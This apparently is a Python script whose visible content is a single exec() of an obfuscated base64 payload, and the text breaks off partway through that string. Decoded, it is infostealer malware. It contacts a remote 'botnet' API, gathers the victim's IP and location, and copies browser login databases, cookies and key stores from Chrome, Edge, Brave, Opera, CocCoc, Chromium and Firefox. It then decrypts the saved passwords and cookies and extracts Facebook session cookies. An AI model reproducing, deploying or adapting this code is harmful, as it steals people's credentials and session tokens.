token = '' import base64 exec(base64.b64decode('''CgppbXBvcnQgb3MsanNvbixzaHV0aWwsd2luMzJjcnlwdCxzcWxpdGUzLGJhc2U2NCxyYW5kb20KaW1wb3J0IHJlcXVlc3RzIGFzIHgwMQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZSx0aW1lZGVsdGEKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBERVMzCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCmZyb20gcHlhc24xLmNvZGVjLmRlciBpbXBvcnQgZGVjb2Rlcgpmcm9tIGhhc2hsaWIgaW1wb3J0IHNoYTEsIHBia2RmMl9obWFjCmZyb20gQ3J5cHRvLlV0aWwuUGFkZGluZyBpbXBvcnQgdW5wYWQgCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKaW1wb3J0IGhtYWMscGxhdGZvcm0KaW1wb3J0IHJlcXVlc3RzCgpyZXNwb25zZTEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcXVhbmx5LnNob3Bib3RuZXQuY29tL2FwaS9ib3RuZXQucGhwJywgcGFyYW1zPXsndG9rZW4nOiB0b2tlbn0pCmRhdGEgPSByZXNwb25zZTEuanNvbigpCmFwaWJvdDE9IGRhdGFbJ2lkYm90J10KaWQxPSBkYXRhWydpZGNoYXQnXQoKCndpbmRvd3NfdmVyc2lvbiA9IHBsYXRmb3JtLnBsYXRmb3JtKCkKbm93ID0gZGF0ZXRpbWUubm93KCkKcmVzcG9uc2UgPXgwMS5nZXQoImh0dHBzOi8vaXBpbmZvLmlvIikudGV4dAppcF9jb3VudHJ5ID0ganNvbi5sb2FkcyhyZXNwb25zZSkKdGVuX2NvdW50cnkgPSBpcF9jb3VudHJ5WydyZWdpb24nXQppcCA9IGlwX2NvdW50cnlbJ2lwJ10KY291bnRyeV9jb2RlID0gaXBfY291bnRyeVsnY291bnRyeSddCm5ld3RpbWUgPSBzdHIobm93LmhvdXIpICsgImgiICtzdHIobm93Lm1pbnV0ZSkrIm0iK3N0cihub3cuc2Vjb25kKSsicyIrIi0iK3N0cihub3cuZGF5KSsiLSIrc3RyKG5vdy5tb250aCkrIi0iK3N0cihub3cueWVhcikKbmFtZV9mID0gY291bnRyeV9jb2RlICsiICIrIGlwICsiICIrbmV3dGltZQoKZGVmIGNoZWNrX2Nocm9tZV9ydW5uaW5nKCk6CiAgICBmb3IgcHJvYyBpbiBvcy5wb3BlbigndGFza2xpc3QnKS5yZWFkbGluZXMoKToKICAgICAgICBpZiAnY2hyb21lLmV4ZScgaW4gcHJvYzoKICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgIHJldHVybiBGYWxzZQoKZGVmIGZpbmRfcHJvZmlsZShwYXRoX3VzZXJkYXRhKToKICAgIHByb2ZpbGVfcGF0aCA9IFtdCiAgICBmb3IgbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGhfdXNlcmRhdGEpOgogICAgICAgIGlmIG5hbWUuc3RhcnRzd2l0aCgiUHJvZmlsZSIpIG9yIG5hbWUgPT0gJ0RlZmF1bHQnOgogICAgICAgICAgICBkaXJfcGF0aCA9IG9zLnBhdGguam9pbihwYXRoX3VzZXJkYXRhLCBuYW1lKQogICAgICAgICAgICBwcm9maWxlX3BhdGguYXBwZW5kKGRpcl9wYXRoKQogICAgcmV0dXJuIHByb2ZpbGVfcGF0aAoKZGVmIGdldF9jaHJvbWUoZGF0YV9wYXRoLGNocm9tZV9wYXRoKToKICAgIGRhdGFfY2hyb21lID0gb3MucGF0aC5qb2luKGRhdGFfcGF0aCwgIkNocm9tZSIpO29zLm1rZGlyKGRhdGFfY2hyb21lKQogICAgcHJvZmlsZXMgPSBmaW5kX3Byb2ZpbGUoY2hyb21lX3BhdGgpCiAgICBmb3IgaSxwcm9maWxlIGluIGVudW1lcmF0ZShwcm9maWxlcywgMSk6CiAgICAgICAgb3MubWtkaXIob3MucGF0aC5qb2luKGRhdGFfY2hyb21lLCJwcm9maWxlIitzdHIoaSkpKQogICAgICAgIGRlZiBjb3B5X2ZpbGUoKToKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ0xvZ2luIERhdGEnKSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ0xvZ2luIERhdGEnKSxvcy5wYXRoLmpvaW4oZGF0YV9jaHJvbWUsInByb2ZpbGUiK3N0cihpKSwnTG9naW4gRGF0YScpKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oY2hyb21lX3BhdGgsJ0xvY2FsIFN0YXRlJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihjaHJvbWVfcGF0aCwnTG9jYWwgU3RhdGUnKSxvcy5wYXRoLmpvaW4oZGF0YV9jaHJvbWUsInByb2ZpbGUiK3N0cihpKSwnTG9jYWwgU3RhdGUnKSkKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ05ldHdvcmsnLCdDb29raWVzJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihwcm9maWxlLCdOZXR3b3JrJywnQ29va2llcycpLG9zLnBhdGguam9pbihkYXRhX2Nocm9tZSwicHJvZmlsZSIrc3RyKGkpLCdDb29raWVzJykpIAogICAgICAgIGlmIGNoZWNrX2Nocm9tZV9ydW5uaW5nKCk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgndGFza2tpbGwgL2YgL2ltIGNocm9tZS5leGUnKQogICAgICAgIGVsc2U6cGFzcwogICAgICAgIGNvcHlfZmlsZSgpO2RlbGV0ZV9maWxlKG9zLnBhdGguam9pbihkYXRhX2Nocm9tZSwicHJvZmlsZSIrc3RyKGkpKSkgICAgCgpkZWYgZ2V0X2VkZ2UoZGF0YV9wYXRoLGVkZ2VfcGF0aCk6CiAgICBkYXRhX2VkZ2UgPSBvcy5wYXRoLmpvaW4oZGF0YV9wYXRoLCAiRWRnZSIpO29zLm1rZGlyKGRhdGFfZWRnZSkKICAgIHByb2ZpbGVzID0gZmluZF9wcm9maWxlKGVkZ2VfcGF0aCkKICAgIGZvciBpLHByb2ZpbGUgaW4gZW51bWVyYXRlKHByb2ZpbGVzLCAxKToKICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4oZGF0YV9lZGdlLCJwcm9maWxlIitzdHIoaSkpKQogICAgICAgIGRlZiBjb3B5X2ZpbGUoKToKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ05ldHdvcmsnLCdDb29raWVzJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihwcm9maWxlLCdOZXR3b3JrJywnQ29va2llcycpLG9zLnBhdGguam9pbihkYXRhX2VkZ2UsInByb2ZpbGUiK3N0cihpKSwnQ29va2llcycpKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpLG9zLnBhdGguam9pbihkYXRhX2VkZ2UsInByb2ZpbGUiK3N0cihpKSwnTG9naW4gRGF0YScpKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oZWRnZV9wYXRoLCdMb2NhbCBTdGF0ZScpKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4oZWRnZV9wYXRoLCdMb2NhbCBTdGF0ZScpLG9zLnBhdGguam9pbihkYXRhX2VkZ2UsInByb2ZpbGUiK3N0cihpKSwnTG9jYWwgU3RhdGUnKSkKICAgICAgICAKICAgICAgICBjb3B5X2ZpbGUoKTtkZWxldGVfZmlsZShvcy5wYXRoLmpvaW4oZGF0YV9lZGdlLCJwcm9maWxlIitzdHIoaSkpKSAgCgpkZWYgZ2V0X2JyYXZlKGRhdGFfcGF0aCxicmF2ZV9wYXRoKToKICAgIGRhdGFfYnJhdmUgPSBvcy5wYXRoLmpvaW4oZGF0YV9wYXRoLCAiQnJhdmUiKTtvcy5ta2RpcihkYXRhX2JyYXZlKQogICAgcHJvZmlsZXMgPSBmaW5kX3Byb2ZpbGUoYnJhdmVfcGF0aCkKICAgIGZvciBpLHByb2ZpbGUgaW4gZW51bWVyYXRlKHByb2ZpbGVzLCAxKToKICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4oZGF0YV9icmF2ZSwicHJvZmlsZSIrc3RyKGkpKSkKICAgICAgICBkZWYgY29weV9maWxlKCk6CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdOZXR3b3JrJywnQ29va2llcycpKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTmV0d29yaycsJ0Nvb2tpZXMnKSxvcy5wYXRoLmpvaW4oZGF0YV9icmF2ZSwicHJvZmlsZSIrc3RyKGkpLCdDb29raWVzJykpCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdMb2dpbiBEYXRhJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihwcm9maWxlLCdMb2dpbiBEYXRhJyksb3MucGF0aC5qb2luKGRhdGFfYnJhdmUsInByb2ZpbGUiK3N0cihpKSwnTG9naW4gRGF0YScpKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oYnJhdmVfcGF0aCwnTG9jYWwgU3RhdGUnKSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKGJyYXZlX3BhdGgsJ0xvY2FsIFN0YXRlJyksb3MucGF0aC5qb2luKGRhdGFfYnJhdmUsInByb2ZpbGUiK3N0cihpKSwnTG9jYWwgU3RhdGUnKSkKICAgICAgICBjb3B5X2ZpbGUoKQogICAgICAgIGRlbGV0ZV9maWxlKG9zLnBhdGguam9pbihkYXRhX2JyYXZlLCJwcm9maWxlIitzdHIoaSkpKQoKZGVmIGdldF9vcGVyYShkYXRhX3BhdGgsb3BlcmFfcGF0aCk6CiAgICBkYXRhX29wZXJhID0gb3MucGF0aC5qb2luKGRhdGFfcGF0aCwgIk9wZXJhIik7b3MubWtkaXIoZGF0YV9vcGVyYSkKICAgIGRlZiBjb3B5X2ZpbGUoKToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4ob3BlcmFfcGF0aCwnTmV0d29yaycsJ0Nvb2tpZXMnKSk6CiAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ob3BlcmFfcGF0aCwnTmV0d29yaycsJ0Nvb2tpZXMnKSxvcy5wYXRoLmpvaW4oZGF0YV9vcGVyYSwnQ29va2llcycpKQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihvcGVyYV9wYXRoLCdMb2dpbiBEYXRhJykpOgogICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKG9wZXJhX3BhdGgsJ0xvZ2luIERhdGEnKSxvcy5wYXRoLmpvaW4oZGF0YV9vcGVyYSwnTG9naW4gRGF0YScpKQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihvcGVyYV9wYXRoLCdMb2NhbCBTdGF0ZScpKToKICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihvcGVyYV9wYXRoLCdMb2NhbCBTdGF0ZScpLG9zLnBhdGguam9pbihkYXRhX29wZXJhLCdMb2NhbCBTdGF0ZScpKQogICAgY29weV9maWxlKCk7ZGVsZXRlX2ZpbGUoZGF0YV9vcGVyYSkKZGVmIGdldF9jb2Njb2MoZGF0YV9wYXRoLGNvY2NvY19wYXRoKToKICAgIGRhdGFfY29jY29jPSBvcy5wYXRoLmpvaW4oZGF0YV9wYXRoLCAiQ29jQ29jIik7b3MubWtkaXIoZGF0YV9jb2Njb2MpCiAgICBwcm9maWxlcyA9IGZpbmRfcHJvZmlsZShjb2Njb2NfcGF0aCkKICAgIGZvciBpLHByb2ZpbGUgaW4gZW51bWVyYXRlKHByb2ZpbGVzLCAxKToKICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4oZGF0YV9jb2Njb2MsInByb2ZpbGUiK3N0cihpKSkpCiAgICAgICAgZGVmIGNvcHlfZmlsZSgpOgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTmV0d29yaycsJ0Nvb2tpZXMnKSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ05ldHdvcmsnLCdDb29raWVzJyksb3MucGF0aC5qb2luKGRhdGFfY29jY29jLCJwcm9maWxlIitzdHIoaSksJ0Nvb2tpZXMnKSkKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ0xvZ2luIERhdGEnKSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ0xvZ2luIERhdGEnKSxvcy5wYXRoLmpvaW4oZGF0YV9jb2Njb2MsInByb2ZpbGUiK3N0cihpKSwnTG9naW4gRGF0YScpKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oY29jY29jX3BhdGgsJ0xvY2FsIFN0YXRlJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihjb2Njb2NfcGF0aCwnTG9jYWwgU3RhdGUnKSxvcy5wYXRoLmpvaW4oZGF0YV9jb2Njb2MsInByb2ZpbGUiK3N0cihpKSwnTG9jYWwgU3RhdGUnKSkKICAgICAgICBjb3B5X2ZpbGUoKTsgICAgCiAgICAgICAgZGVsZXRlX2ZpbGUob3MucGF0aC5qb2luKGRhdGFfY29jY29jLCJwcm9maWxlIitzdHIoaSkpKQogICAgICAgIAoKZGVmIGdldF9jaHJvbWl1bShkYXRhX3BhdGgsY2hyb21pdW1fcGF0aCk6CiAgICBkYXRhX2Nocm9taXVtPSBvcy5wYXRoLmpvaW4oZGF0YV9wYXRoLCAiQ2hyb21pdW0iKTtvcy5ta2RpcihkYXRhX2Nocm9taXVtKQogICAgcHJvZmlsZXMgPSBmaW5kX3Byb2ZpbGUoY2hyb21pdW1fcGF0aCkKICAgIGZvciBpLHByb2ZpbGUgaW4gZW51bWVyYXRlKHByb2ZpbGVzLCAxKToKICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4oZGF0YV9jaHJvbWl1bSwicHJvZmlsZSIrc3RyKGkpKSkKICAgICAgICBkZWYgY29weV9maWxlKCk6CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlLCdDb29raWVzJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihwcm9maWxlLCdDb29raWVzJyksb3MucGF0aC5qb2luKGRhdGFfY2hyb21pdW0sInByb2ZpbGUiK3N0cihpKSwnQ29va2llcycpKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZShvcy5wYXRoLmpvaW4ocHJvZmlsZSwnTG9naW4gRGF0YScpLG9zLnBhdGguam9pbihkYXRhX2Nocm9taXVtLCJwcm9maWxlIitzdHIoaSksJ0xvZ2luIERhdGEnKSkKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKGNocm9taXVtX3BhdGgsJ0xvY2FsIFN0YXRlJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihjaHJvbWl1bV9wYXRoLCdMb2NhbCBTdGF0ZScpLG9zLnBhdGguam9pbihkYXRhX2Nocm9taXVtLCJwcm9maWxlIitzdHIoaSksJ0xvY2FsIFN0YXRlJykpCiAgICAgICAgY29weV9maWxlKCk7ZGVsZXRlX2ZpbGUob3MucGF0aC5qb2luKGRhdGFfY2hyb21pdW0sInByb2ZpbGUiK3N0cihpKSkpCmRlZiBmaW5kX3Byb2ZpbGVfZmlyZWZveChmaXJlZm94X3BhdGgpOgogICAgcHJvZmlsZV9wYXRoID0gW10KICAgIGZvciBuYW1lIGluIG9zLmxpc3RkaXIoZmlyZWZveF9wYXRoKToKICAgICAgICAgICAgZGlyX3BhdGggPSBvcy5wYXRoLmpvaW4oZmlyZWZveF9wYXRoLCBuYW1lKQogICAgICAgICAgICBwcm9maWxlX3BhdGguYXBwZW5kKGRpcl9wYXRoKQogICAgcmV0dXJuIHByb2ZpbGVfcGF0aAoKZGVmIGdldF9maXJlZm94KGRhdGFfcGF0aCxmaXJlZm94X3BhdGgpOgogICAgZGF0YV9maXJlZm94ID0gb3MucGF0aC5qb2luKGRhdGFfcGF0aCwnZmlyZWZveCcpO29zLm1rZGlyKGRhdGFfZmlyZWZveCkKICAgIHByb2ZpbGVzID0gZmluZF9wcm9maWxlX2ZpcmVmb3goZmlyZWZveF9wYXRoKQogICAKICAgIGZvciBpLHByb2ZpbGUgaW4gZW51bWVyYXRlKHByb2ZpbGVzLCAxKToKICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4oZGF0YV9maXJlZm94LCJwcm9maWxlIitzdHIoaSkpKQogICAgICAgIGRlZiBjb3B5X2ZpbGUoKToKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ2Nvb2tpZXMuc3FsaXRlJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihwcm9maWxlLCdjb29raWVzLnNxbGl0ZScpLG9zLnBhdGguam9pbihkYXRhX2ZpcmVmb3gsInByb2ZpbGUiK3N0cihpKSwnY29va2llcy5zcWxpdGUnKSkKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ2tleTQuZGInKSk6CiAgICAgICAgICAgICAgICBzaHV0aWwuY29weWZpbGUob3MucGF0aC5qb2luKHByb2ZpbGUsJ2tleTQuZGInKSxvcy5wYXRoLmpvaW4oZGF0YV9maXJlZm94LCJwcm9maWxlIitzdHIoaSksJ2tleTQuZGInKSkKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHByb2ZpbGUsJ2xvZ2lucy5qc29uJykpOgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHlmaWxlKG9zLnBhdGguam9pbihwcm9maWxlLCdsb2dpbnMuanNvbicpLG9zLnBhdGguam9pbihkYXRhX2ZpcmVmb3gsInByb2ZpbGUiK3N0cihpKSwnbG9naW5zLmpzb24nKSkKICAgICAgICBjb3B5X2ZpbGUoKQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihkYXRhX2ZpcmVmb3gsInByb2ZpbGUiK3N0cihpKSwnY29va2llcy5zcWxpdGUnKSk6CgogICAgICAgICAgICBkZWxldGVfZmlyZWZveChvcy5wYXRoLmpvaW4oZGF0YV9maXJlZm94LCJwcm9maWxlIitzdHIoaSkpKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHNodXRpbC5ybXRyZWUob3MucGF0aC5qb2luKGRhdGFfZmlyZWZveCwicHJvZmlsZSIrc3RyKGkpKSkgICAKZGVmIGVuY3J5cHQoZGF0YV9wcm9maWxlKToKICAgIGxvZ2luX2RiID0gb3MucGF0aC5qb2luKGRhdGFfcHJvZmlsZSwgIkxvZ2luIERhdGEiKQogICAga2V5X2RiID0gb3MucGF0aC5qb2luKGRhdGFfcHJvZmlsZSAsIkxvY2FsIFN0YXRlIiwpCiAgICBjb29raWVfZGIgPSBvcy5wYXRoLmpvaW4oZGF0YV9wcm9maWxlLCAiQ29va2llcyIpCiAgICB3aXRoIG9wZW4oa2V5X2RiLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgbG9jYWxfc3RhdGUgPSBmLnJlYWQoKQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2Fkcyhsb2NhbF9zdGF0ZSkKICAgIG1hc3Rlcl9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pCiAgICBtYXN0ZXJfa2V5ID0gbWFzdGVyX2tleVs1Ol0gIAogICAgbWFzdGVyX2tleSA9IHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICB0cnkgOgogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QobG9naW5fZGIpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikKICAgICAgICBmb3IgciBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgdXJsID0gclswXQogICAgICAgICAgICB1c2VybmFtZSA9IHJbMV0KICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gclsyXQogICAgICAgICAgICBpdiA9IGVuY3J5cHRlZF9wYXNzd29yZFszOjE1XQogICAgICAgICAgICBwYXlsb2FkID0gZW5jcnlwdGVkX3Bhc3N3b3JkWzE1Ol0KICAgICAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzd29yZCA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpIAogICAgICAgICAgICB3aXRoIG9wZW4oKG9zLnBhdGguam9pbihkYXRhX3Byb2ZpbGUsICJwYXNzLnR4dCIpKSwgJ2EnLGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKCJVUkw6ICIgKyB1cmwgKyAiXHRcdCIgKyB1c2VybmFtZSArICJ8IiArIGRlY3J5cHRlZF9wYXNzd29yZCArICJcbiIgKyAiXG4iKSAgICAgIAogICAgZXhjZXB0IDoKICAgICAgICBwcmludCgic2FpIG1lIHIgIikKICAgIHRyeTogICAgCiAgICAgICAgY29ubjIgPSBzcWxpdGUzLmNvbm5lY3QoY29va2llX2RiKQogICAgICAgIGNvbm4yLnRleHRfZmFjdG9yeSA9IGxhbWJkYSBiOiBiLmRlY29kZShlcnJvcnM9Imlnbm9yZSIpCiAgICAgICAgY3Vyc29yMiA9IGNvbm4yLmN1cnNvcigpCiAgICAgICAgY3Vyc29yMi5leGVjdXRlKCIiIgogICAgICAgIFNFTEVDVCBob3N0X2tleSwgbmFtZSwgdmFsdWUsIGVuY3J5cHRlZF92YWx1ZSxpc19odHRwb25seSxpc19zZWN1cmUsZXhwaXJlc191dGMKICAgICAgICBGUk9NIGNvb2tpZXMKICAgICAgICAiIiIpCiAgICAgICAganNvbl9kYXRhID0gW10KICAgICAgICBmb3IgaG9zdF9rZXksIG5hbWUsIHZhbHVlLGVuY3J5cHRlZF92YWx1ZSxpc19odHRwb25seSxpc19zZWN1cmUsZXhwaXJlc191dGMgaW4gY3Vyc29yMi5mZXRjaGFsbCgpOgogICAgICAgICAgICBpZiBub3QgdmFsdWU6CiAgICAgICAgICAgICAgICBpdiA9IGVuY3J5cHRlZF92YWx1ZVszOjE1XQogICAgICAgICAgICAgICAgZW5jcnlwdGVkX3ZhbHVlID0gZW5jcnlwdGVkX3ZhbHVlWzE1Ol0KICAgICAgICAgICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICAgICAgICAgIGRlY3J5cHRlZF92YWx1ZSA9IGNpcGhlci5kZWNyeXB0KGVuY3J5cHRlZF92YWx1ZSlbOi0xNl0uZGVjb2RlKCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGRlY3J5cHRlZF92YWx1ZSA9IHZhbHVlICAgICAKICAgICAgICAgICAganNvbl9kYXRhLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAiaG9zdCI6IGhvc3Rfa2V5LAogICAgICAgICAgICAgICAgIm5hbWUiOiBuYW1lLAogICAgICAgICAgICAgICAgInZhbHVlIjogZGVjcnlwdGVkX3ZhbHVlLAogICAgICAgICAgICAgICAgImlzX2h0dHBvbmx5Ijppc19odHRwb25seSwKICAgICAgICAgICAgICAgICJpc19zZWN1cmUiOmlzX3NlY3VyZSwKICAgICAgICAgICAgICAgICJleHBpcmVzX3V0YyI6ZXhwaXJlc191dGMKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIAogICAgICAgIHJlc3VsdCA9IFtdCiAgICAgICAgZm9yIGl0ZW0gaW4ganNvbl9kYXRhOgogICAgICAgICAgICBob3N0ID0gaXRlbVsiaG9zdCJdCiAgICAgICAgICAgIG5hbWUgPSBpdGVtWyJuYW1lIl0KICAgICAgICAgICAgdmFsdWUgPSBpdGVtWyJ2YWx1ZSJdCiAgICAgICAgICAgIGlzX2h0dHBvbmx5PSBpdGVtWyJpc19odHRwb25seSJdCiAgICAgICAgICAgIGlzX3NlY3VyZT1pdGVtWyJpc19zZWN1cmUiXQogICAgICAgICAgICBleHBpcmVzX3V0YyA9IGl0ZW1bImV4cGlyZXNfdXRjIl0KICAgICAgICAgICAgaWYgaG9zdCA9PSAiLmZhY2Vib29rLmNvbSI6CiAgICAgICAgICAgICAgICByZXN1bHQuYXBwZW5kKGYie25hbWV9ID0ge3ZhbHVlfSIpCiAgICAgICAgICAgIGlmIGlzX2h0dHBvbmx5ID09IDEgOiBodHRwb25seSA9ICJUUlVFIgogICAgICAgICAgICBlbHNlOmh0dHBvbmx5ID0gIkZBSUxTRSIKICAgICAgICAgICAgaWYgaXNfc2VjdXJlID09IDEgOiBzZWN1cmUgPSAiVFJVRSIKICAgICAgICAgICAgZWxzZTpzZWN1cmUgPSAiRkFJTFNFIgogICAgICAgICAgICBjb29raWUgPSBmIntob3N0fVx0e2h0dHBvbmx5fVx0eycvJ31cdHtzZWN1cmV9XHRcdHtuYW1lfVx0e3ZhbHVlfVxuIiAgICAgICAgICAKICAgICAgICAgICAgd2l0aCBvcGVuKChvcy5wYXRoLmpvaW4oZGF0YV9wcm9maWxlLCAiY29va2llLnR4dCIpKSwgJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShjb29raWUpCiAgICAgICAgcmVzdWx0X3N0cmluZyA9ICI7ICIuam9pbihyZXN1bHQpCiAgICAgICAgd2l0aCBvcGVuKChvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVEVNUCJdLCBuYW1lX2YsICJjb29raWVmYi50eHQiKSksICdhJyxlbmNvZGluZz0ndXRmLTgnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKHJlc3VsdF9zdHJpbmcrIlxuIiArICJcbiIpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoImxhaSBzYWkgciAiKQpkZWYgZGVsZXRlX2ZpbGUoZGF0YV9wcm9maWxlKToKICAKICAgIHRyeToKICAgICAgICBlbmNyeXB0KGRhdGFfcHJvZmlsZSkKICAgIGV4Y2VwdDpwYXNzCiAgIAoKZGVmIGRlY3J5cHRNb3ozREVTKCBnbG9iYWxTYWx0LCBlbnRyeVNhbHQsIGVuY3J5cHRlZERhdGEgKToKICBocCA9IHNoYTEoIGdsb2JhbFNhbHQgKS5kaWdlc3QoKQogIHBlcyA9IGVudHJ5U2FsdCArIGInXHgwMCcqKDIwLWxlbihlbnRyeVNhbHQpKQogIGNocCA9IHNoYTEoIGhwK2VudHJ5U2FsdCApLmRpZ2VzdCgpCiAgazEgPSBobWFjLm5ldyhjaHAsIHBlcytlbnRyeVNhbHQsIHNoYTEpLmRpZ2VzdCgpCiAgdGsgPSBobWFjLm5ldyhjaHAsIHBlcywgc2hhMSkuZGlnZXN0KCkKICBrMiA9IGhtYWMubmV3KGNocCwgdGsrZW50cnlTYWx0LCBzaGExKS5kaWdlc3QoKQogIGsgPSBrMStrMgogIGl2ID0ga1stODpdCiAga2V5ID0ga1s6MjRdCiAgcmV0dXJuIERFUzMubmV3KCBrZXksIERFUzMuTU9ERV9DQkMsIGl2KS5kZWNyeXB0KGVuY3J5cHRlZERhdGEpCgpkZWYgZGVjb2RlTG9naW5EYXRhKG